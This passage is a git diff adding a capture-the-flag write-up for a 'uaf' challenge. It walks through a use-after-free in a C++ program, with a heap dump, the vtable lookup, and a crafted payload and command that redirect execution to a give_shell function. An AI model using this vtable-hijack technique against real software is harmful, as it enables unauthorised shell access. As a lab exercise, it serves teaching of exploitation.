@@ -539,5 +539,48 @@ guaranteed to find all of the standard utilities, so we can run `cat` normally.
 Our solution will be:
 `./cmd2 "command -p cat *"`
 
+### Level 16 - uaf
+
+We have a cpp code, which allocates 2 classes, Male and Female.
+Each one of them has an `introduce` function, and a `give_shell` function which they inherit from Human.
+We can choose between 3 different actions to do:
+1. call introduce in each one of the  classes
+2. allocate a string to the memory
+3. free the classes
+
+first of all, lets see how the classes look in the heap:
+```
+0x614ea0        0x0000000000000000      0x0000000000000031      ........1.......
+0x614eb0        0x0000000000000004      0x0000000000000004      ................
+0x614ec0        0x0000000000000000      0x000000006b63614a      ........Jack....
+0x614ed0        0x0000000000000000      0x0000000000000021      ........!.......
+0x614ee0        0x0000000000401570      0x0000000000000019      p.@.............
+
+0x614ef0        0x0000000000614ec8      0x0000000000000031      .Na.....1.......
+0x614f00        0x0000000000000004      0x0000000000000004      ................
+0x614f10        0x0000000000000000      0x000000006c6c694a      ........Jill....
+0x614f20        0x0000000000000000      0x0000000000000021      ........!.......
+0x614f30        0x0000000000401550      0x0000000000000015      P.@.............
+```
+if we set a breakpoint right before the first introduce, we can see the value of rax, to see the address of the vtable.
+After doing it, we get `0x0000000000401570`
+Then we can see in the dissassemble, that it will add 8 bytes to the vtable, and then it will call that function:
+
+![image](https://user-images.githubusercontent.com/56035342/211359440-91d9a83f-1457-43de-b440-7a8feb4dbc11.png)
+If we disassemble the first address in this image, we can see that its the `give_shell` function.
+So, in order to run that function, we would have to change the stored vtable address to 0x0000000000401570 - 8 bytes (because then it will add 8 bytes, and it will call the `give_shell` function)
+We can do that by using deleteing the classes by using option 3 in the menu, and then using option 2, which allocates a string to the heap.
+the size of the chunk is 32 bytes, so our allocated string should be 32 bytes in total.
+But because each malloc allocates extra 8 bytes, we should write 24 bytes.
+Which means our payload will be:
+`python -c "print('\x68\x15\x40\x00\x00\x00\x00\x00')" > payload`
+`./uaf 24 payload`
+
+
+
+
+
+
+
 
 
